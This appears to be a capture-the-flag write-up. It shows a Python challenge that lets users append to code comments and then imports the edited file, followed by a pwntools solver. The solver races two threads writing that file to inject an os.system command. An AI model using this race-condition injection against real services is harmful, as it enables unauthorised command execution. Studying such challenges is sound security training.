```py -cwn
import string

source = """#!/usr/bin/env python3 
# We would like to extend our sincere apologies due to the fiasco
# displayed below. As we all know, when we write python, we should
# closely follow the zen of python. Just to refresh your mind, I'll
# share the most important lines with you again:
\"\"\"
Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
\"\"\"

# Extra safety, make sure no code is run:
quit()

def wish_printer():
    # 
    wish = 'Kalmar says' + ' cheers!!'
    print(wish)
"""

lines = source.split('\n')

ALLOWED_CHARACTERS = string.ascii_letters + string.digits + string.punctuation + ' '

# Loop over lines and let user edit comments:
for i, line in enumerate(lines):
    if i == 0: # We ignore the shebang line of course
        continue
    if not line.lstrip().startswith('#'):
        continue
    print(f'Line {i} is a comment. Currently it is `{line}`. What would you like to append?')
    user_input = input('> ')
    if not all(c in ALLOWED_CHARACTERS for c in user_input):
        print('Make sure to not use any funky characters! We want readable comments!')
        continue
    new_line = line + user_input
    if len(new_line) > 72:
        print('Comment too long! Make sure to follow PEP-8!')
        continue
    lines[i] = new_line

# Write new file
new_python_file = '\n'.join(lines)
with open('commented_code.py', 'w') as wf:
    wf.write(new_python_file)

print(f"\nCommented code succesfully written to file. Here's the code:\n```\n{new_python_file}\n```\n")

# Let's make sure the file is not broken:
try:
    __import__('commented_code')
except SyntaxError as e:
    print('SyntaxError:', str(e))
    quit()

print('Yay, no errors! Thanks for commenting our code!')
```

#### Can be pwned

```py -cwn
from pwn import *
import threading

payload1 = ['ding:hz', 'AAAAAA', 'AAAAA', 'ABCDEAAAAAAAAAAAAAAAAAAA', 'ABCDEFGHIJKLMAAAAAAAAAAAAAAAAA~', 'Aif __import__("os").system("ls -la") and True:']
payload2 = ['ding:hz', '~', '~', '', '~', 'asdfasdf']

def connect():
    return process(['python3', './server.py'], level='error')

def spam1():
    att = 0
    while True:
        att += 1
        if att % 100 == 0:
            print('thread1', att)
        conn = connect()
        for v in payload1:
            conn.sendline(v.encode())
        res = conn.recvuntil(b'Thanks').decode()
        if 'total' in res:
            print(res)
            exit()
        conn.close()

def spam2():
    att = 0
    while True:
        att += 1
        if att % 100 == 0:
            print('thread2', att)
        conn = connect()
        for v in payload2:
            conn.sendline(v.encode())
        res = conn.recvuntil(b'Thanks').decode()
        if 'total' in res:
            print(res)
            exit()
        conn.close()

thread1 = threading.Thread(target=spam1)
thread2 = threading.Thread(target=spam2)

thread1.start()
thread2.start()

thread1.join()
thread2.join()
```